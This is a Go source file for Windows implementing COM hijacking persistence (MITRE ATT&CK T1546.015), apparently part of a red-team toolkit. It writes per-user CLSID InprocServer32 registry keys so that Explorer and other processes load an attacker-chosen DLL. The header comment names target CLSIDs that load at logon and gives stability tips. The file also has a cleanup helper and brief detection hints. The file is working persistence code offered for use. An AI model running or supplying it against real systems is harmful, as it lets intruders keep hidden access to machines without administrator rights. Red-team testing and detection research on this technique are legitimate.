// +build windows

// COM Hijacking Persistence - MITRE ATT&CK T1546.015
//
// Hijacks a Component Object Model class registration in HKCU so that any
// process which instantiates the target CLSID loads our DLL instead of the
// legitimate one.  No administrator privileges required: HKCU\Software\Classes
// is consulted before HKLM during CLSID resolution.
//
// Common targets (loaded by Explorer / Shell on logon):
//   {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}  ScheduledTasks (Task Scheduler MMC)
//   {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}  Shell Folder
//   {42aedc87-2188-41fd-b9a3-0c966feabec1}  IShellFolderViewCB
//
// The hijacking DLL must export DllGetClassObject and either implement the
// expected interface or proxy back to the original DLL.  Mismatched
// ThreadingModel can crash the host process - "Apartment" is the safe default
// for Shell-loaded objects.
//
// Detection: Sysmon Event ID 12/13/14 on HKCU\Software\Classes\CLSID,
// autoruns "COM Hijacks" tab.

package main

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows/registry"
)

// HijackCLSID writes HKCU\Software\Classes\CLSID\{clsid}\InprocServer32 so
// that COM activation of the target CLSID for the current user loads dllPath.
func HijackCLSID(clsid, dllPath string) error {
	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsid)

	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("CreateKey: %w", err)
	}
	defer k.Close()

	// Default ("(Default)") value: full path to the hijacking DLL.
	if err := k.SetStringValue("", dllPath); err != nil {
		return fmt.Errorf("set default value: %w", err)
	}
	if err := k.SetStringValue("ThreadingModel", "Apartment"); err != nil {
		return fmt.Errorf("set ThreadingModel: %w", err)
	}

	fmt.Printf("[+] Hijacked CLSID %s -> %s\n", clsid, dllPath)
	return nil
}

// RestoreCLSID removes the hijack registry tree (cleanup helper).
func RestoreCLSID(clsid string) error {
	parent := fmt.Sprintf(`Software\Classes\CLSID\%s`, clsid)
	// Leaf must be deleted before parent; DeleteKey only removes empty keys.
	if err := registry.DeleteKey(registry.CURRENT_USER, parent+`\InprocServer32`); err != nil {
		return fmt.Errorf("delete InprocServer32: %w", err)
	}
	if err := registry.DeleteKey(registry.CURRENT_USER, parent); err != nil {
		return fmt.Errorf("delete CLSID: %w", err)
	}
	fmt.Printf("[+] Restored CLSID %s\n", clsid)
	return nil
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("usage: persistence_com.exe <CLSID> <dll-path>")
		fmt.Println(`  example: persistence_com.exe "{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}" C:\Tools\hijack.dll`)
		return
	}
	if err := HijackCLSID(os.Args[1], os.Args[2]); err != nil {
		fmt.Println("[-]", err)
	}
}
